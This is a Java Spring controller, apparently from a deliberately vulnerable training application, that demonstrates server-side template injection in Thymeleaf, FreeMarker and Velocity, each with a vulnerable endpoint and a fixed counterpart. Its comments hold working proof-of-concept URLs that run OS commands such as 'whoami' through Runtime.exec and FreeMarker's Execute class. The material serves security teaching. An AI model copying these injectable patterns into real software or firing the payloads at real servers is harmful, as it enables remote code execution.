package com.best.hello.controller;

import freemarker.cache.StringTemplateLoader;
import freemarker.core.TemplateClassResolver;
import freemarker.template.Configuration;
import freemarker.template.TemplateException;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.apache.velocity.runtime.RuntimeServices;
import org.apache.velocity.runtime.RuntimeSingleton;
import org.apache.velocity.runtime.parser.ParseException;
import org.apache.velocity.runtime.parser.node.SimpleNode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

/**
 * SSTI （服务端模板注入）
 *
 * @author nul1
 * @date 2022/09/20
 */
@Api("服务端模版注入")
@Controller
@RequestMapping("/vulnapi/SSTI")
public class SSTI {
    private final Configuration conf;
    private final StringTemplateLoader stringTemplateLoader;

    public SSTI(Configuration configuration) {
        this.conf = configuration;
        this.stringTemplateLoader = new StringTemplateLoader();
        configuration.setTemplateLoader(stringTemplateLoader);
    }
    Logger log = LoggerFactory.getLogger(SSTI.class);

    /**
     * Spring Boot Thymeleaf 模板注入
     * 当请求/path?lang=en时服务器去自动拼接待查找的模板文件名，为resources/templates/lang/en.html
     *
     * @poc http://127.0.0.1:8888/SSTI/thymeleaf/vul?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27whoami%27).getInputStream()).next()%7d__::.x
     */
    @ApiOperation(value = "vul：thymeleaf模版注入")
    @GetMapping("/thymeleaf/vul")
    public String thymeleafVul(@RequestParam String lang) {
        // 模版文件参数可控
        return "lang/" + lang;
    }

    @ApiOperation(value = "safe：thymeleaf白名单")
    @GetMapping("/thymeleaf/safe")
    public String thymeleafSafe(@RequestParam String lang) {
        List<String> white_list = new ArrayList<String>();
        white_list.add("en");
        white_list.add("zh");

        if (white_list.contains(lang)) {
            return "lang/" + lang;
        } else {
            return "commons/401";
        }
    }

    /**
     * 根据spring boot定义，如果controller无返回值，则以GetMapping的路由为视图名称，即将请求的url作为视图名称，调用模板引擎去解析，在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞
     *
     * @poc http://127.0.0.1:8888/SSTI/doc/vul/__${T(java.lang.Runtime).getRuntime().exec("open -a Calculator")}__::.x
     */
    @ApiOperation(value = "vul：url作为视图名")
    @GetMapping("/doc/vul/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("[vul] SSTI payload: " + document);
    }


    @ApiOperation(value = "safe", notes = "由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析")
    @GetMapping("/doc/safe/{document}")
    public void getDocument(@PathVariable String document, HttpServletResponse response) {
        log.info("[safe] SSTI payload: " + document);
    }

    /**
     * SpringBoot Thymeleaf 片段选择器注入
     * @poc http://127.0.0.1:8888/vulnapi/SSTI/thymeleaf/fragment/vul?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22).getInputStream()).next()%7d__::.x
     */
    @ApiOperation(value = "val：url作为片段选择器")
    @GetMapping("/thymeleaf/fragment/vul")
    public String fragmentVul(@RequestParam String section) {
        return "lang/en :: " + section;
    }

    /**
     * 设置 @ResponseBody 注解告诉 Spring 将返回值作为响应体处理，而不再是视图名称，因此无法进行模版注入攻击
     */
    @ApiOperation(value = "safe", notes = "由于设置 @ResponseBody 注解告诉 Spring 将返回值作为响应体处理，而不再是视图名称，因此无法进行模版注入攻击")
    @GetMapping("/thymeleaf/fragment/safe")
    @ResponseBody
    public String fragmentSafe(@RequestParam String section) {
        return "lang/en :: " + section;
    }

    /**
     * SpringBoot FreeMarker 模版注入
     * @poc http://127.0.0.1:8888/vulnapi/SSTI/freemarker/vul?file=index.ftl&content=%3C%23assign%20ex%3d%22freemarker%2etemplate%2eutility%2eExecute%22%3fnew%28%29%3E%20%24%7b%20ex%28%22whoami%22%29%20%7d
     */

    @ApiOperation(value = "vul：freemarker模版注入")
    @GetMapping("/freemarker/vul")
    public String freemarkerVul(@RequestParam String file, @RequestParam String content, Model model, HttpServletRequest request) {
        log.info("[vul] FreeMarker payload: {}", content);
        if (!file.trim().isEmpty()) {
            // 防止目录穿越
            if (!file.contains("..") && !file.startsWith("/")) {
                if (!content.trim().isEmpty()) {
                    // 检查类路径下模板是否存在
                    String resourcePath = "templates/freemarker/" + file;
                    InputStream is = getClass().getClassLoader().getResourceAsStream(resourcePath);
                    if (is != null) {
                        try {
                            is.close();
                        } catch (IOException e) {
                            log.error("关闭流失败", e);
                        }

                        // 如果请求路径为 /vulnapi/SSTI/freemarker/safe 则不设置解析所有类
                        if (!request.getRequestURI().startsWith("/vulnapi/SSTI/freemarker/safe")) {
                            conf.setNewBuiltinClassResolver(TemplateClassResolver.UNRESTRICTED_RESOLVER);
                        }

                        // 添加模板到StringTemplateLoader（名称需与后续查找一致）
                        stringTemplateLoader.putTemplate(file, content);
                        // 禁用缓存以确保立即生效
                        conf.setTemplateUpdateDelayMilliseconds(0);
                        // 关闭模版加载时的异常日志
                        conf.setLogTemplateExceptions(false);
                        return file.replace(".ftl", "");
                    }
                    model.addAttribute("error", "模版文件不存在！");
                    return "commons/404";
                }
                model.addAttribute("error", "文件内容不能为空！");
                return "commons/400";
            }
            model.addAttribute("error", "文件名称非法！");
            return "commons/400";
        }
        model.addAttribute("error", "文件名不能为空！");
        return "commons/400";
    }

    @ApiOperation(value = "vul：freemarker模版注入修复代码")
    @GetMapping("/freemarker/safe")
    public String freemarkerSafe(@RequestParam String file, @RequestParam String content, Model model, HttpServletRequest request) throws TemplateException {
        // 使用安全的解析器
        conf.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
        // 关闭 FreeMarker debug 信息
        conf.setTemplateExceptionHandler(freemarker.template.TemplateExceptionHandler.RETHROW_HANDLER);
        return this.freemarkerVul(file, content, model, request);
    }

    /**
     * velocity 模版注入evaluate场景
     * @poc http://127.0.0.1:8888/vulnapi/SSTI/velocity/evaluate/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22open%20-a%20Calculator%22)
     */
    @ApiOperation(value = "vul：velocity模版注入evaluate场景")
    @GetMapping("/velocity/evaluate/vul")
    @ResponseBody
    public String velocityEvaluateVul(@RequestParam(defaultValue = "hello-java-sec") String username) {
        String templateString = "Hello, " + username + " | Full name: $name, phone: $phone, email: $email";
        Velocity.init();
        VelocityContext ctx = new VelocityContext();
        ctx.put("name", "hello-java-sec");
        ctx.put("phone", "012345678");
        ctx.put("email", "xxx@xxx.com");
        StringWriter out = new StringWriter();
        Velocity.evaluate(ctx, out, "test", templateString);
        return out.toString();
    }

    /**
     * velocity 模版注入merge场景
     * @poc http://127.0.0.1:8888/vulnapi/SSTI/velocity/merge/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22open%20-a%20Calculator%22)
     */
    @ApiOperation(value = "vul：velocity模版注入merge场景")
    @GetMapping("/velocity/merge/vul")
    @ResponseBody
    public String velocityMergeVul(@RequestParam(defaultValue = "hello-java-sec") String username) throws IOException, ParseException {
        // 获取模版文件内容
        BufferedReader bufferedReader = new BufferedReader(new FileReader(String.valueOf(Paths.get(this.getClass().getClassLoader().getResource("templates/velocity/merge.vm").toString().replace("file:", "")))));
        StringBuilder stringBuilder = new StringBuilder();
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line);
        }
        String templateString = stringBuilder.toString();
        templateString = templateString.replace("<USERNAME>", username);
        StringReader reader = new StringReader(templateString);
        VelocityContext ctx = new VelocityContext();
        ctx.put("name", "hello-java-sec");
        ctx.put("phone", "012345678");
        ctx.put("email", "xxx@xxx.com");

        StringWriter out = new StringWriter();
        org.apache.velocity.Template template = new org.apache.velocity.Template();

        RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
        SimpleNode node = runtimeServices.parse(reader, String.valueOf(template));

        template.setRuntimeServices(runtimeServices);
        template.setData(node);
        template.initDocument();

        template.merge(ctx, out);

        return out.toString();
    }


}
